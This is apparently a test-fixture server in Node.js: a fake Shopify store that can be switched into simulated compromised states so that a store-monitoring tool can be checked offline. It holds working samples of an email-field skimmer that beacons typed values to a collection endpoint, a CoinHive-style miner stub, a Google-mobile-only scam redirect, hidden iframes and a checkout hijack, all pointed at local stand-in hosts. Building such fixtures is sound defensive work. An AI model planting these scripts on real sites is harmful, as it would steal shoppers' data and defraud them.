/**
 * A small fake Shopify storefront for testing Store Guard offline.
 * Mirrors Dawn-theme markup and Shopify's public endpoints.
 * Breakage switches (env MOCK_BREAK, comma separated): atc, search, checkout, noindex, links, jserror, password,
 *   hijack (checkout sends shoppers to a look-alike checkout on another site, like the October 2026 app compromises)
 * Catalog extras (env MOCK_EXTRA): price (kurta Small drops to 699), sale (compare-at lower than the price),
 * placeholder (lorem ipsum / TBD in the saree description), clean (the diya gets a price, an image, its own SKU
 * and a description, so the whole catalog is healthy). Without `clean` the diya is priced at zero, has no image
 * and reuses the kurta's SKU.
 * theme (a sale banner and warmer colours), restyle (a theme update that turns every page dark)
 * Breakage switches (env MOCK_BREAK, comma separated): atc, search, checkout, noindex, links, jserror, password
 * robots.txt (env MOCK_EXTRA): robots-shopify, robots-block, robots-slow. GET /__requests lists the requests received.
 * Script extras (env MOCK_EXTRA): newscript, badscript (see NEW_SCRIPT and BAD_SCRIPT below);
 * skimmer, formreader (form-field readers, see FORM_EXTRAS below).
 * Hijack extras (env MOCK_EXTRA or live via /__extra): redirect, phoneredirect, hiddenframe, badframe, miner (see HIJACK below).
 * Script extras (env MOCK_EXTRA): newscript, badscript, atcscript (see LIVE_EXTRA below).
 * Script extras (env MOCK_EXTRA): newscript, badscript (see NEW_SCRIPT and BAD_SCRIPT below);
 * apps, appsbug, appsupdate, appsnowidget, appscode (App Health: two outside apps, see APP_SCRIPTS below).
 * Variant extras (MOCK_EXTRA): brokenvariant (Kurta Large shown in stock, cart refuses it), unpublishedvariant
 * (cart can't find Kurta Medium), manyvariants (a 40-colour cushion cover, one colour sold out).
 * Breakage switches (env MOCK_BREAK, comma separated): atc, search, checkout, noindex, links, jserror, password,
 * spam (hidden casino/pill links and text in the footer), cloaked (a link to another site moved off the page),
 * deface (homepage replaced with a hacker's message), replaced (homepage replaced with unrelated content)
 */
import http from 'node:http';
import { URL } from 'node:url';

const PORT = Number(process.env.MOCK_PORT || 4100);
// A look-alike checkout on a different site. 127.0.0.1 is a different host from localhost, so it stands in for
// an attacker's domain without needing the network; the page looks exactly like the real checkout.
const HIJACK = `http://127.0.0.1:${PORT}/checkouts/cn/fake-pay`;
const BREAK = new Set((process.env.MOCK_BREAK || '').split(',').filter(Boolean));
// A draft theme opened with ?preview_theme_id=… (Shopify keeps it for the session via a cookie).
const DRAFT_BREAK = new Set([...BREAK, ...(process.env.MOCK_DRAFT_BREAK ?? 'theme,atc').split(',').filter(Boolean)]);
let B = BREAK; // the breakages for the request being handled
let DRAFT = false;
const carts = new Map();
let PW_POSTS = 0; // how many times the password form was submitted
const REQUESTS = [];

const EXTRA = (process.env.MOCK_EXTRA || '');
const DE = EXTRA.includes('de');
const TRACK = EXTRA.includes('track');
const CLEAN = EXTRA.split(',').includes('clean');
const US = EXTRA.split(',').includes('us'); // US privacy: the "Your privacy choices" link
// Script watch: newscript adds an app script from another site to every page; badscript adds one from a
// site on the known-bad list (tests add evil-cdn.localhost to BAD_DOMAINS). *.localhost always reaches this machine.
// Both can also be switched on and off while the store runs: GET /__extra?newscript=1&badscript=0.
// App Health (APP_SCRIPTS): apps adds a reviews app (reviews-app.localhost, every page, ~60 KB, draws a widget) and a
// chat app (chat-app.localhost, home page only, pings chat-api.localhost); appsbug makes the reviews script throw;
// appsupdate gives the reviews app a second script; appsnowidget: the reviews script loads but draws nothing;
// appscode: new content in reviews.js at the same address. Tests name them with APP_NAMES and APP_WIDGETS.
// appsupdate gives the reviews app a second script. Tests name them with APP_NAMES.
// atcscript: an outside "upsell pop-up" script (127.0.0.1) that stops Add to cart from working.
// FORM_EXTRAS: both add an email sign-up box to every page, read by the store's own script (never reported).
//   skimmer     an outside script (127.0.0.1) that listens to the email box and sends what was typed to /collect
//   formreader  an outside script (127.0.0.1) that reads the email box but sends nothing (like a chat widget)
const FORM_EXTRAS = ['skimmer', 'formreader'];
// HIJACK (security S2), the signs of a hacked store:
//   redirect       the home page sends every visitor to a scam site (prize-win.localhost) after a moment
//   phoneredirect  the same, but only for phone shoppers arriving from Google (what real infections do)
//   hiddenframe    product and cart pages load an invisible 1×1 page from stat-counter.localhost
//   badframe       the same from evil-cdn.localhost (on the known-bad list in tests)
//   miner          the home page loads /assets/perf.js, CoinHive-style mining code that opens a pool connection
const LIVE_KEYS = ['newscript', 'badscript', 'redirect', 'phoneredirect', 'hiddenframe', 'badframe', 'miner', ...FORM_EXTRAS, 'atcscript', 'apps', 'appsbug', 'appsupdate', 'newscript', 'badscript', 'apps', 'appsbug', 'appsupdate', 'appsnowidget', 'appscode'];
const LIVE_EXTRA = new Set(LIVE_KEYS.filter((k) => EXTRA.split(',').includes(k) || (['newscript', 'badscript', 'newscript', 'badscript', 'apps', 'appsbug', 'appsupdate', 'appsnowidget', 'appscode', 'apps', 'appsbug', 'appsupdate', 'atcscript', ...FORM_EXTRAS].includes(k) && EXTRA.includes(k))));
let PATH = '/'; // the page being served
const COLLECTED = []; // what the skimmer sent, for tests: GET /__collected
const formBox = () => (FORM_EXTRAS.some((k) => LIVE_EXTRA.has(k)) ? '<form class="newsletter" onsubmit="return false"><label for="NewsletterEmail">Email</label> <input type="email" id="NewsletterEmail" name="contact[email]" autocomplete="email"></form>' : '');
let REQ_PATH = '/';
const scriptTags = () => (LIVE_EXTRA.has('newscript') ? `<script src="http://127.0.0.1:${PORT}/apps/review-widget.js?v=${Date.now()}"></script>` : '')
  + (LIVE_EXTRA.has('badscript') ? `<script src="http://evil-cdn.localhost:${PORT}/lib/m.js"></script>` : '')
  + (PATH === '/' && LIVE_EXTRA.has('redirect') ? `<script>setTimeout(function(){location.href='http://prize-win.localhost:${PORT}/claim?ref=store'},300);</script>` : '')
  + (PATH === '/' && LIVE_EXTRA.has('phoneredirect') ? `<script>if(/Mobile|Android/.test(navigator.userAgent)&&/google\./.test(document.referrer))setTimeout(function(){location.replace('http://prize-win.localhost:${PORT}/claim')},300);</script>` : '')
  + (PATH === '/' && LIVE_EXTRA.has('miner') ? '<script src="/assets/perf.js"></script>' : '')
  + (FORM_EXTRAS.some((k) => LIVE_EXTRA.has(k)) ? '<script src="/assets/newsletter.js"></script>' : '')
  + (LIVE_EXTRA.has('skimmer') ? `<script src="http://127.0.0.1:${PORT}/apps/pixel-helper.js"></script>` : '')
  + (LIVE_EXTRA.has('formreader') ? `<script src="http://127.0.0.1:${PORT}/apps/chat-widget.js"></script>` : '')
  + (LIVE_EXTRA.has('atcscript') ? `<script src="http://127.0.0.1:${PORT}/apps/upsell-popup.js"></script>` : '')
  + (LIVE_EXTRA.has('badscript') ? `<script src="http://evil-cdn.localhost:${PORT}/lib/m.js"></script>` : '')
  + (LIVE_EXTRA.has('apps') ? `<script src="http://reviews-app.localhost:${PORT}/apps/reviews.js?shop=mock"></script>` : '')
  + (LIVE_EXTRA.has('apps') && LIVE_EXTRA.has('appsupdate') ? `<script src="http://reviews-app.localhost:${PORT}/apps/reviews-photos.js"></script>` : '')
  + (LIVE_EXTRA.has('apps') && REQ_PATH === '/' ? `<script src="http://chat-app.localhost:${PORT}/apps/chat.js" async></script>` : '');
const frameTags = () => (/^\/(products\/|cart$)/.test(PATH) ? (LIVE_EXTRA.has('hiddenframe') ? `<iframe src="http://stat-counter.localhost:${PORT}/f.html?id=7" width="1" height="1" style="position:absolute;left:-3000px;border:0"></iframe>` : '')
  + (LIVE_EXTRA.has('badframe') ? `<iframe src="http://evil-cdn.localhost:${PORT}/f.html" style="display:none"></iframe>` : '') : '');
const MINER_JS = "window.CoinHive={Anonymous:function(k,o){this.start=function(){try{new WebSocket('ws://pool.minexmr.localhost:" + PORT + "/proxy');}catch(e){}};}};var miner=new CoinHive.Anonymous('SITE_KEY',{throttle:0.3});miner.start();";
const FORM_JS = {
  // The store's own sign-up script: listens to and reads the box (allowed).
  '/assets/newsletter.js': "document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('change',function(){window.__signup=i.value;});});",
  // A skimmer: listens to the email box and sends its value elsewhere, twice (image beacon and a POST with base64).
  '/apps/pixel-helper.js': `(function(){function grab(e){var v=e.target.value;if(!v)return;new Image().src='http://127.0.0.1:${PORT}/collect?e='+encodeURIComponent(v);fetch('http://127.0.0.1:${PORT}/collect',{method:'POST',mode:'no-cors',body:JSON.stringify({d:btoa(v)})});}
document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('input[type=email]').forEach(function(i){i.addEventListener('change',grab);});});})();`,
  // A chat widget that pre-fills its own form from the sign-up box: reads it, sends nothing.
  '/apps/chat-widget.js': "document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('input',function(){window.__chatEmail=i.value;});});",
};
const APP_SCRIPTS = {
  '/apps/reviews.js': () => `/* reviews app${LIVE_EXTRA.has('appscode') ? ' 2.0' : ''} */${'/*' + 'x'.repeat(60000) + '*/'}`
    + (LIVE_EXTRA.has('appsnowidget') ? 'window.__reviewsOff=true;' : `document.addEventListener('DOMContentLoaded',function(){var d=document.createElement('div');d.className='reviews-widget';d.textContent='★★★★★ 128 reviews';(document.querySelector('main')||document.body).appendChild(d);});`)
    + (LIVE_EXTRA.has('appsbug') ? 'setTimeout(function reviewsInit(){ window.reviewsConfig.load(); }, 10);' : ''),
  '/apps/reviews-photos.js': () => 'window.__reviewPhotos=true;',
  '/apps/chat.js': () => `new Image().src='http://chat-api.localhost:${PORT}/ping.gif';window.__chat=true;`,
};
const products = [
  { id: 1, title: 'Organic Cotton Kurta', handle: 'cotton-kurta', body_html: '<p>Soft breathable organic cotton kurta for everyday wear.</p>', product_type: 'Kurta', vendor: 'Tharam', tags: 'cotton, festive', images: [{ src: '/img/k.png' }], variants: [
    { id: 101, title: 'Small', sku: 'KUR-S', price: EXTRA.includes('price') ? '699.00' : '1499.00', compare_at_price: EXTRA.includes('sale') ? '1299.00' : null, available: true },
    { id: 102, title: 'Medium', sku: 'KUR-M', price: '1499.00', available: true },
    { id: 103, title: 'Large', sku: 'KUR-L', price: '1599.00', available: true } ] },
  { id: 2, title: 'Handwoven Silk Saree', handle: 'silk-saree', product_type: 'Saree', vendor: 'Tharam', tags: 'silk', body_html: EXTRA.includes('placeholder') ? '<p>Lorem ipsum dolor sit amet, TBD description here.</p>' : '<p>Traditional handwoven silk saree with zari border and intricate detailing.</p>', images: [{ src: '/img/s.png' }], variants: [{ id: 201, title: 'Default Title', sku: 'SAR-1', price: '8999.00', available: true }] },
  CLEAN
    ? { id: 3, title: 'Brass Diya Set', handle: 'brass-diya', product_type: 'Decor', vendor: 'Tharam', tags: 'brass', body_html: '<p>Set of four hand-cast brass diyas for Diwali and everyday puja.</p>', images: [{ src: '/img/d.png' }], variants: [{ id: 301, title: 'Default Title', sku: 'DIY-4', price: '799.00', available: true }] }
    : { id: 3, title: 'Brass Diya Set', handle: 'brass-diya', product_type: 'Decor', vendor: 'Tharam', tags: 'brass', body_html: '', images: [], variants: [{ id: 301, title: 'Default Title', sku: 'KUR-S', price: '0.00', available: true }] },
];
if (EXTRA.includes('manyvariants')) products.push({ id: 4, title: 'Block Print Cushion Cover', handle: 'cushion-cover', product_type: 'Decor', vendor: 'Tharam', tags: 'cotton', body_html: '<p>Hand block printed cotton cushion cover, 16 by 16 inches.</p>', images: [{ src: '/img/c.png' }],
  variants: Array.from({ length: 40 }, (_, i) => ({ id: 401 + i, title: `Colour ${i + 1}`, sku: `CUS-${i + 1}`, price: '799.00', available: i !== 39 })) });
// Variants the cart treats differently from the product list (what the every-variant sweep looks for).
const CART_REFUSES = new Map();
if (EXTRA.includes('brokenvariant')) CART_REFUSES.set(103, [422, { status: 422, message: 'Cart Error', description: 'This item could not be added to your cart.' }]);
if (EXTRA.includes('unpublishedvariant')) CART_REFUSES.set(102, [404, { status: 404, message: 'Cart Error', description: 'Cannot find variant' }]);
let ADD_CALLS = 0; // cart/add.js requests, so tests can see the sweep is capped
// Sale traffic (MOCK_EXTRA): slowcrowd = pages get slow when several shoppers are on them at once;
// crowdfail = Add to cart fails when shoppers add at the same moment (only the first of a burst succeeds).
let INFLIGHT = 0;
let LAST_ADD = 0;
const CROWD_PAGE = (p) => (p.startsWith('/products/') && !p.endsWith('.js')) || p === '/cart' || p.startsWith('/checkouts/') || p === '/checkout';
const byId = new Map(products.flatMap((p) => p.variants.map((v) => [v.id, { p, v }])));

function cartFor(req, res) {
  const m = /cart=([a-z0-9]+)/.exec(req.headers.cookie || '');
  let id = m && m[1];
  if (!id || !carts.has(id)) {
    id = Math.random().toString(36).slice(2, 12);
    carts.set(id, []);
    res.setHeader('Set-Cookie', `cart=${id}; Path=/`);
  }
  return carts.get(id);
}
// Discount codes, like Shopify's: BF20 takes 20% off; MIN5000 needs a cart of ₹5,000 or more; anything else is unknown.
// MOCK_BREAK=discount makes BF20 stop working (e.g. it expired or a discount app broke it).
const CODES = { BF20: { pct: 20, min: 0 }, MIN5000: { pct: 10, min: 500000 } };
function cartJson(items) {
  const original = items.reduce((s, i) => s + i.quantity * Math.round(Number(i.price) * 100), 0);
  const code = items.discount;
  const rule = code && !(B.has('discount') && code === 'BF20') ? CODES[code] : null;
  const applicable = !!rule && original >= rule.min;
  const off = applicable ? Math.round((original * rule.pct) / 100) : 0;
  return {
    item_count: items.reduce((s, i) => s + i.quantity, 0),
    original_total_price: original,
    total_discount: off,
    total_price: original - off,
    discount_codes: code ? [{ code, applicable }] : [],
    cart_level_discount_applications: off ? [{ type: 'discount_code', title: code, total_allocated_amount: off }] : [],
    currency: 'INR',
    items,
  };
}
function layout(title, body, { noindex = false } = {}) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
${B.has('noindex') || noindex ? '<meta name="robots" content="noindex">' : ''}
<meta name="description" content="Handmade Indian clothing and decor from small artisans.">
<link rel="canonical" href="http://localhost:${PORT}/"><meta property="og:image" content="/img/og.png">
<script>window.Shopify={shop:'mock.myshopify.com',theme:${DRAFT ? "{id:222,name:'Dawn – Diwali draft',role:'unpublished'}" : "{id:111,name:'Dawn',role:'main'}"}};</script>
${B.has('jserror') ? '<script>setTimeout(function(){ undefinedAppFunction(); }, 10);</script>' : ''}<script src="/assets/theme.js?v=111"></script>${scriptTags()}
${B.has('theme') ? '<style>body{background:#fff4d6} h1{color:#b3261e;font-size:48px}</style>' : ''}${B.has('restyle') ? '<style>body{background:#111;color:#eee} a{color:#9cf}</style>' : ''}</head><body>${B.has('theme') ? '<div style="background:#b3261e;color:#fff;padding:18px;font:700 22px sans-serif">DIWALI SALE · 40% OFF</div>' : ''}<header><a href="/">Mock Store</a> <nav><a href="/collections/all">Shop</a> <a href="/pages/about">About</a> <a href="/search">Search</a> ${B.has('links') ? '<a href="/pages/old-sale">Sale</a> <a href="/collections/discontinued">Old</a>' : ''} <a href="/cart">Cart</a></nav></header>
<main id="MainContent">${body}</main>${formBox()}${DRAFT ? '<iframe id="preview-bar-iframe" style="position:fixed;bottom:0;left:0;width:100%;height:60px;border:0;background:#222"></iframe>' : ''}${frameTags()}${B.has('spam') ? '<div style="position:absolute;left:-9999px;top:0"><a href="https://best-casino-bonus.example/">online casino</a> <a href="https://pills.example/buy">cheap viagra</a></div><p style="display:none">replica watches and payday loans at low prices</p>' : ''}${B.has('cloaked') ? '<a href="https://link-farm.example/" style="font-size:0">partner</a>' : ''}<footer><a href="/policies/privacy-policy">${DE ? 'Datenschutz' : 'Privacy'}</a> <a href="/policies/refund-policy">${DE ? 'Widerrufsbelehrung' : 'Refunds'}</a>${US ? ' <a href="/pages/data-sharing-opt-out">Your privacy choices</a>' : ''}${DE ? ' <a href="/pages/impressum">Impressum</a> <a href="/policies/terms-of-service">AGB</a> <a href="/pages/accessibility">Barrierefreiheit</a> <a href="https://ec.europa.eu/consumers/odr">OS-Plattform</a> <a class="withdraw" href="/pages/widerruf" style="font-weight:700">Vertrag widerrufen</a>' : ''}</footer>${TRACK ? '<script src="https://connect.facebook.net/en_US/fbevents.js" async></script>' : ''}</body></html>`;
}
function send(res, status, body, type = 'text/html; charset=utf-8') {
  res.writeHead(status, { 'Content-Type': type });
  res.end(typeof body === 'string' ? body : JSON.stringify(body));
}
function productCard(p) {
  return `<div class="card"><a href="/products/${p.handle}">${p.title}</a><span class="price">₹${p.variants[0].price}</span></div>`;
}
async function readBody(req) {
  let b = '';
  for await (const c of req) b += c;
  return b;
}

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, `http://localhost:${PORT}`);
  const p = u.pathname;
  PATH = p;
  // Other websites (the scam page, the hidden-page host) are served by this same process.
  const host = String(req.headers.host || '');
  if (host.startsWith('prize-win.')) return send(res, 200, '<!doctype html><html><head><title>Congratulations!</title></head><body style="font:24px sans-serif;background:#ffe14d;padding:40px"><h1>You won an iPhone 16!</h1><p>Enter your card details to claim your prize.</p></body></html>');
  if (host.startsWith('stat-counter.') || (host.startsWith('evil-cdn.') && p === '/f.html')) return send(res, 200, '<!doctype html><html><body></body></html>');
  if (p === '/assets/perf.js') return send(res, 200, MINER_JS, 'application/javascript');
  const previewId = u.searchParams.get('preview_theme_id');
  if (previewId) res.setHeader('Set-Cookie', `preview_theme=${previewId}; Path=/`);
  DRAFT = !!previewId || /preview_theme=\d+/.test(req.headers.cookie || '');
  B = DRAFT ? DRAFT_BREAK : BREAK;
  REQ_PATH = u.pathname;
  if (B.has('cloudflare')) {
    res.writeHead(403, { 'Content-Type': 'text/html', 'cf-ray': '8f00test-BOM', server: 'cloudflare' });
    return res.end('<!doctype html><html><head><title>Just a moment...</title></head><body><div id="challenge-form">Verify you are human</div><script>window._cf_chl_opt={}</script></body></html>');
  }
  if (p === '/collect') {
    const body = req.method === 'POST' ? await readBody(req) : '';
    COLLECTED.push({ method: req.method, query: u.search, body });
    res.writeHead(204, { 'Access-Control-Allow-Origin': '*' });
    return res.end();
  }
  if (p === '/__collected') return send(res, 200, { collected: COLLECTED }, 'application/json');
  if (FORM_JS[p]) return send(res, 200, FORM_JS[p], 'application/javascript');
  if (EXTRA.includes('slowcrowd') && CROWD_PAGE(p) && req.method === 'GET') {
    INFLIGHT++;
    try {
      await new Promise((r) => setTimeout(r, 800));
      if (INFLIGHT >= 2) await new Promise((r) => setTimeout(r, 2500));
    } finally { INFLIGHT--; }
  }
  if (p === '/__carts') return send(res, 200, { carts: [...carts.values()].map((c) => c.length) }, 'application/json');
  if (p === '/__pwcount') return send(res, 200, { posts: PW_POSTS }, 'application/json');
  // Every request the store received (method, path, user agent), for tests that limit how a visitor behaves.
  if (p === '/__requests') return send(res, 200, { requests: REQUESTS }, 'application/json');
  if (!p.startsWith('/__')) REQUESTS.push({ method: req.method, path: p + u.search, ua: req.headers['user-agent'] || '' });
  // robots.txt: none by default. MOCK_EXTRA=robots-shopify serves Shopify's default rules (no cart or checkout
  // for bots); robots-block asks Tharam's checker to stay away entirely; robots-slow sets a crawl delay.
  if (p === '/robots.txt') {
    if (EXTRA.includes('robots-shopify')) return send(res, 200, 'User-agent: *\nDisallow: /admin\nDisallow: /cart\nDisallow: /orders\nDisallow: /checkouts/\nDisallow: /checkout\nDisallow: /account\nDisallow: /search\nAllow: /products/*.js\n\nSitemap: http://localhost:' + PORT + '/sitemap.xml\n', 'text/plain');
    if (EXTRA.includes('robots-block')) return send(res, 200, 'User-agent: *\nAllow: /\n\nUser-agent: TharamBot\nDisallow: /\n', 'text/plain');
    if (EXTRA.includes('robots-slow')) return send(res, 200, 'User-agent: *\nCrawl-delay: 2\n', 'text/plain');
    return send(res, 404, 'Not found', 'text/plain');
  }
  if (p === '/__extra') {
    for (const k of LIVE_KEYS) if (u.searchParams.has(k)) u.searchParams.get(k) === '1' ? LIVE_EXTRA.add(k) : LIVE_EXTRA.delete(k);
    return send(res, 200, { extra: [...LIVE_EXTRA] }, 'application/json');
  }
  if (p === '/__addcount') return send(res, 200, { adds: ADD_CALLS, carts: [...carts.values()].map((c) => c.length) }, 'application/json');
  if (B.has('password') && !/storefront_digest=ok/.test(req.headers.cookie || '') && !p.startsWith('/password')) {
    res.writeHead(302, { Location: '/password' });
    return res.end();
  }
  if (p === '/password') {
    if (req.method === 'POST') {
      PW_POSTS++;
      const body = await readBody(req);
      if (/password=letmein/.test(body)) {
        res.writeHead(302, { Location: '/', 'Set-Cookie': 'storefront_digest=ok; Path=/; HttpOnly' });
        return res.end();
      }
    }
    return send(res, 200, layout('Opening soon', '<form method="post" action="/password"><input type="password" name="password"><button>Enter</button></form>'));
  }
  if (p === '/sitemap.xml') return send(res, 200, '<?xml version="1.0"?><urlset><sitemap><loc>http://localhost:'+PORT+'/sitemap_products_1.xml</loc></sitemap></urlset>', 'application/xml');
  if (p === '/sitemap_products_1.xml') return send(res, 200, '<?xml version="1.0"?><urlset>'+products.map(x=>'<url><loc>http://localhost:'+PORT+'/products/'+x.handle+'</loc></url>').join('')+'</urlset>', 'application/xml');
  if (p.startsWith('/collections/') && p.endsWith('/products.json')) return send(res, 200, { products: products.slice(0,2) }, 'application/json');
  if (p === '/products.json') return send(res, 200, { products }, 'application/json');
  if (p === '/collections.json') return send(res, 200, { collections: [{ title: 'Festive', handle: 'festive', products_count: 3 }] }, 'application/json');
  if (p === '/' && B.has('deface')) return send(res, 200, `<!doctype html><html><head><title>Hacked by Gh0st Crew</title></head><body style="background:#000;color:#0f0;font:700 40px monospace;text-align:center;padding-top:120px"><h1>HACKED BY GH0ST CREW</h1><p>Your security is low. Greetz to all.</p></body></html>`);
  if (p === '/' && B.has('replaced')) return send(res, 200, `<!doctype html><html><head><title>Welcome</title></head><body style="background:#123;color:#fff;font:28px sans-serif;padding:80px"><h1>Exclusive offers today</h1><p>Claim your prize now. Limited time members only bonus available worldwide.</p></body></html>`);
  if (p === '/') return send(res, 200, layout('Mock Store – Handmade in India', `<h1>Handmade in India</h1><img src="/img/hero.png" width="800" height="400" alt="Artisans at work">${products.map(productCard).join('')}`));
  if (p.startsWith('/collections/')) {
    if (p === '/collections/discontinued') return send(res, 404, layout('Not found', '<h1>404</h1>'));
    return send(res, 200, layout('Festive collection', `<h1>Festive</h1>${products.map(productCard).join('')}`));
  }
  if (p === '/search') {
    const qq = (u.searchParams.get('q') || '').toLowerCase();
    const hits = B.has('search') ? [] : products.filter((x) => x.title.toLowerCase().includes(qq));
    return send(res, 200, layout('Search', `<h1>Search</h1>${hits.map(productCard).join('') || '<p>No results</p>'}`));
  }
  // Shopify's product JSON (prices in cents), used by themes and by our checks.
  { const m = /^\/products\/([\w-]+)\.js$/.exec(p); if (m) { const pr = products.find((x) => x.handle === m[1]); if (!pr) return send(res, 404, { status: 404 }, 'application/json');
    return send(res, 200, { id: pr.id, title: pr.title, handle: pr.handle, variants: pr.variants.map((v) => ({ id: v.id, title: v.title, available: v.available, price: Math.round(Number(v.price) * 100) })) }, 'application/json'); } }
  if (p.startsWith('/products/')) {
    const prod = products.find((x) => x.handle === p.split('/')[2]);
    if (!prod) return send(res, 404, layout('Not found', '<h1>404</h1>'));
    const vid = Number(u.searchParams.get('variant')) || prod.variants[0].id;
    const v = prod.variants.find((x) => x.id === vid) || prod.variants[0];
    const breakAtc = B.has('atc')
      ? `<script>document.addEventListener('submit',function(e){e.preventDefault();},true);</script>`
      : `<script>document.addEventListener('submit',function(e){var f=e.target;if(!f.action.includes('/cart/add'))return;e.preventDefault();fetch('/cart/add.js',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({items:[{id:Number(f.id.value),quantity:1}]})}).then(function(){document.getElementById('cart-count').textContent='1';});});</script>`;
    return send(
      res,
      200,
      layout(
        `${prod.title} – Mock Store`,
        `<h1>${prod.title}</h1><div class="price">₹${v.price}</div>
<form method="post" action="/cart/add"><input type="hidden" name="id" value="${v.id}">
<select onchange="location.search='?variant='+this.value">${prod.variants.map((x) => `<option value="${x.id}" ${x.id === v.id ? 'selected' : ''}>${x.title}</option>`).join('')}</select>
<button type="submit" name="add" class="product-form__submit" ${v.available ? '' : 'disabled'}>${v.available ? 'Add to cart' : 'Sold out'}</button></form>${DE ? '<p class="tax-note">inkl. MwSt., zzgl. <a href="/policies/shipping-policy">Versandkosten</a></p>' : ''}
<span id="cart-count">0</span>${breakAtc}`
      )
    );
  }
  if (p === '/cart.js') return send(res, 200, cartJson(cartFor(req, res)), 'application/json');
  if (p === '/cart/add.js' && req.method === 'POST') {
    const items = cartFor(req, res);
    const body = JSON.parse((await readBody(req)) || '{}');
    ADD_CALLS++;
    if (EXTRA.includes('crowdfail')) { const now = Date.now(); const busy = now - LAST_ADD < 400; LAST_ADD = now; if (busy) return send(res, 503, { status: 503, description: 'Too many requests at once' }, 'application/json'); }
    for (const it of body.items || [{ id: body.id, quantity: body.quantity || 1 }]) {
      const refused = CART_REFUSES.get(Number(it.id));
      if (refused) return send(res, refused[0], refused[1], 'application/json');
      const hit = byId.get(Number(it.id));
      if (!hit || !hit.v.available) return send(res, 422, { status: 422, description: 'Sold out' }, 'application/json');
      items.push({ id: hit.v.id, title: hit.p.title, quantity: it.quantity || 1, price: hit.v.price, handle: hit.p.handle });
    }
    return send(res, 200, { items }, 'application/json');
  }
  if (p === '/cart/update.js' && req.method === 'POST') {
    const items = cartFor(req, res);
    const body = JSON.parse((await readBody(req)) || '{}');
    if (body.discount !== undefined) items.discount = String(body.discount || '').toUpperCase() || undefined;
    return send(res, 200, cartJson(items), 'application/json');
  }
  if (p.startsWith('/discount/')) {
    cartFor(req, res).discount = decodeURIComponent(p.slice(10)).toUpperCase();
    res.writeHead(302, { Location: u.searchParams.get('redirect') || '/' });
    return res.end();
  }
  if (p === '/cart/clear.js') {
    cartFor(req, res).length = 0;
    delete cartFor(req, res).discount;
    return send(res, 200, cartJson([]), 'application/json');
  }
  if (p === '/cart') {
    const items = cartFor(req, res);
    const btn = B.has('checkout') ? '' : '<form action="/cart" method="post"><button type="submit" name="checkout">Check out</button></form>';
    if (req.method === 'POST') {
      res.writeHead(302, { Location: B.has('checkout') ? '/cart' : B.has('hijack') ? HIJACK : '/checkouts/cn/abc123' });
      return res.end();
    }
    return send(res, 200, layout('Your cart', `<h1>Your cart</h1>${items.map((i) => `<a href="/products/${i.handle}">${i.title}</a> x${i.quantity}`).join('<br>')}${btn}`));
  }
  if (p === '/checkout') {
    res.writeHead(302, { Location: B.has('checkout') ? '/cart' : B.has('hijack') ? HIJACK : '/checkouts/cn/abc123' });
    return res.end();
  }
  if (p.startsWith('/checkouts/')) return send(res, 200, layout('Checkout', '<h2>Contact</h2><input type="email" name="email" autocomplete="email"><h2>Delivery</h2>'));
  if (p.startsWith('/policies/')) {
    if (!DE && (p.endsWith('terms-of-service') || p.endsWith('shipping-policy'))) return send(res, 404, layout('Not found', '<h1>404</h1>'));
    if (DE && p.endsWith('refund-policy')) return send(res, 200, layout('Widerrufsbelehrung', '<h1>Widerrufsbelehrung</h1><p>Sie haben das Recht, binnen 14 Tagen ohne Angabe von Gründen diesen Vertrag zu widerrufen.</p>'));
    return send(res, 200, layout('Policy', '<h1>Policy</h1>'));
  }
  // Swallows every form submit before the theme sees it, so Add to cart does nothing.
  if (p === '/apps/upsell-popup.js') return send(res, 200, "document.addEventListener('submit',function(e){e.preventDefault();e.stopImmediatePropagation();},true);", 'application/javascript');
  if (APP_SCRIPTS[p] && /^(reviews|chat)-app\.localhost/.test(req.headers.host || '')) return send(res, 200, APP_SCRIPTS[p](), 'application/javascript');
  if (p === '/ping.gif') { res.writeHead(204); return res.end(); }
  if (p === '/assets/theme.js' || p.startsWith('/apps/') || p.startsWith('/lib/')) return send(res, 200, 'window.__loaded=(window.__loaded||0)+1;', 'application/javascript');
  if (p.startsWith('/img/')) {
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
    return send(res, 200, png, 'image/png');
  }
  if (DE && p === '/pages/impressum') return send(res, 200, layout('Impressum', '<h1>Impressum</h1><p>Kaveri Handlooms GmbH, Hauptstraße 1, 10115 Berlin. E-Mail: hallo@kaveri.example</p>'));
  if (p === '/pages/about') return send(res, 200, layout('About', '<h1>About us</h1>'));
  return send(res, 404, layout('Not found', '<h1>404</h1>'));
});

server.listen(PORT, () => console.log(`mock store on http://localhost:${PORT} break=[${[...BREAK]}]`));
export default server;
